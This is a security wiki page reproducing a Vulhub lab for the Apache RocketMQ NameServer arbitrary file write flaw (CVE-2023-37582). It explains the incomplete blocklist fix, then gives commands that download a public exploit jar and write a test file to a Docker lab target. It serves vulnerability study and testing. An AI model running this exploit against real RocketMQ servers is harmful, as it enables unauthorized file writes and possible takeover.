<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/rocketmq/CVE-2023-37582/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache RocketMQ NameServer Arbitrary File Write (CVE-2023-37582) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache RocketMQ NameServer Arbitrary File Write (CVE-2023-37582)", url: "#_top", children: [
              {title: "Vulnerable Environment", url: "#vulnerable-environment" },
              {title: "Exploit", url: "#exploit" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache RocketMQ NameServer 任意文件写入漏洞（CVE-2023-37582）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2023-33246/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2023-33246/README.zh-cn/" class="btn btn-xs btn-link">
        Apache RocketMQ Broker 远程命令执行漏洞（CVE-2023-33246）
      </a>
    </div>
    
  </div>

    

    <h1 id="apache-rocketmq-nameserver-arbitrary-file-write-cve-2023-37582">Apache RocketMQ NameServer Arbitrary File Write (CVE-2023-37582)<a class="headerlink" href="#apache-rocketmq-nameserver-arbitrary-file-write-cve-2023-37582" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Apache RocketMQ is a distributed messaging and streaming platform with low latency, high performance and reliability, trillion-level capacity and flexible scalability.</p>
<p>In RocketMQ versions 5.1.1 and below, there exists an arbitrary file write vulnerability in the NameServer component. The vulnerability exists in the configuration update functionality of RocketMQ's NameServer component. By sending an <code>UPDATE_NAMESRV_CONFIG</code> command to the NameServer, an attacker can modify the <code>configStorePath</code> configuration item and its content, leading to arbitrary file write.</p>
<p>This vulnerability arises from an incomplete fix for <a href="https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246">CVE-2023-33246</a>. In addressing CVE-2023-33246, the official team established a blocklist of configuration items that cannot be modified. However, the patch mistakenly designated the blocklist as <code>configStorePathName</code>, when it should have been <code>configStorePath</code>, leading to this outcome.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/apache/rocketmq/pull/6843">https://github.com/apache/rocketmq/pull/6843</a></li>
<li><a href="https://drun1baby.top/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://drun1baby.top/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li>
<li><a href="https://github.com/Malayke/CVE-2023-37582_EXPLOIT">https://github.com/Malayke/CVE-2023-37582_EXPLOIT</a></li>
</ul>
<h2 id="vulnerable-environment">Vulnerable Environment<a class="headerlink" href="#vulnerable-environment" title="Permanent link">&para;</a></h2>
<p>Execute the following command to start a RocketMQ NameServer 5.1.0:</p>
<div class="highlight"><pre><span></span><code>docker<span class="w"> </span>compose<span class="w"> </span>up<span class="w"> </span>-d
</code></pre></div>
<p>After the environment is started, the RocketMQ NameServer will listen on port 9876.</p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>Use this simple <a href="https://github.com/vulhub/rocketmq-attack">exploit project</a> to reproduce the vulnerability and write arbitrary file.</p>
<div class="highlight"><pre><span></span><code>wget<span class="w"> </span>https://github.com/vulhub/rocketmq-attack/releases/download/1.1/rocketmq-attack-1.1-SNAPSHOT.jar
java<span class="w"> </span>-jar<span class="w"> </span>rocketmq-attack-1.1-SNAPSHOT.jar<span class="w"> </span>AttackNamesrv<span class="w"> </span>--target<span class="w"> </span>your-ip:9876<span class="w"> </span>--path<span class="w"> </span><span class="s2">&quot;/tmp/success&quot;</span><span class="w"> </span>--content<span class="w"> </span><span class="s2">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>
</code></pre></div>
<p>After execution, you can verify that the file has been written successfully:</p>
<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>/tmp/success
</code></pre></div>
<p>The content "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" should be present in the file.</p>
<p><img alt="" src="1.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache RocketMQ NameServer 任意文件写入漏洞（CVE-2023-37582）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2023-33246/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2023-33246/README.zh-cn/" class="btn btn-xs btn-link">
        Apache RocketMQ Broker 远程命令执行漏洞（CVE-2023-33246）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>